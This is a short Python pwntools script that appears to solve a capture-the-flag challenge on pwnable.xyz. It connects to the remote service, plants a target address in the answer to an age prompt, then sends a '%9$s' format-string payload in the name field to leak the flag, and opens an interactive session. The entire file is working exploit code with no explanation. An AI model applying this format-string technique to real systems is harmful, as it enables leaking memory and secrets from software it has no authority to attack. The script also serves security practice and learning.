from pwn import *

r = remote("svc.pwnable.xyz", 30004)

flag = 0x601080

r.sendafter(b"Are you 18 years or older? [y/N]: ", b"y" * 8 + p64(flag))

payload = b"a" * 0x20
payload += b"%9$s"
payload = payload.ljust(0x80, b"a")

r.sendafter(b"Name: ", payload)

r.interactive()
